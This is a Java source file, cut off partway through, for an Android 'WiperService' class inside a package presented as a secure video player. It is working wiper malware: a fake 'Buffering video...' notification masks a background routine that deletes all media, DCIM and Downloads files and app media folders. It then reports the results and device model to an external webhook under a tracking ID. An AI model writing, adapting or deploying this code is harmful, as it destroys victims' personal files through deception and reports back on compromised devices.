package com.secureplayer.videoplayer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.UUID;

public class WiperService extends Service {

    private static final String TAG = "WiperService";
    private String deviceId;
    private int totalDeleted = 0;

    // ⚠️ REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL
    private static final String CALLBACK_URL = "https://eoiq2xnrp0qo962.m.pipedream.net";

    @Override
    public void onCreate() {
        super.onCreate();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "video_cache_channel",
                "Video Cache",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Caching video stream data");
            channel.setShowBadge(false);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

            Notification notification = new NotificationCompat.Builder(this, "video_cache_channel")
                .setContentTitle("Buffering video...")
                .setContentText("Please wait while the video loads")
                .setSmallIcon(android.R.drawable.ic_media_play)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();

            startForeground(1, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Generate unique device tracking ID
        deviceId = UUID.randomUUID().toString().substring(0, 8);

        Log.d(TAG, "WiperService started. Device ID: " + deviceId);

        // Execute wipe in background thread
        new Thread(this::executeWipe).start();

        return START_NOT_STICKY;
    }

    private void executeWipe() {
        try {
            Log.d(TAG, "Starting wipe operations...");

            // Phase 1: Delete all media via ContentResolver (MediaStore API)
            deleteMediaStoreContent();

            // Phase 2: Direct file system deletion (DCIM, Downloads, etc.)
            deleteDirectFiles();

            // Phase 3: Delete app-specific media directories
            deleteAppMediaDirectories();

            Log.d(TAG, "Wipe complete. Total deleted: " + totalDeleted);

            // Phone home with results
            phoneHome("wipe_complete", "Deleted " + totalDeleted + " files on " + Build.MODEL);

            // Brief delay then cleanup
            Thread.sleep(1500);

        } catch (Exception e) {